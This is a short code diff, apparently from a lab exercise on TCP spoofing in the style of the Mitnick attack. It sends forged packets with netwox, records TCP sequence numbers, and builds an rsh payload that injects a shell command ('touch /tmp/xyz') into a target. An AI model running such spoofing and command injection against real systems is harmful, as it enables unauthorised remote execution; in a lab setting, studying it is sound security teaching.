@@ -13,16 +13,19 @@ cmd_3 = 'sudo netwox 40 --tcp-syn --tcp-ack --ip4-src 10.0.2.15 --ip4-dst 10.0.2
 data = "9090\x00seed\x00seed\x00touch /tmp/xyz\x00".encode("utf-8").hex()
 
 def syn_1(pkt):
+        global x
         x=pkt[TCP].seq
         x = x + 1
         print("X: " + str(x))
  
 def syn_ack_1(pkt):
+        global y
         y=pkt[TCP].seq
         y = y + 1
         print("Y: " + str(y))
  
 def syn_2(pkt):
+        global z
         z=pkt[TCP].seq
         z = z + 1
         print("Z: " + str(z))
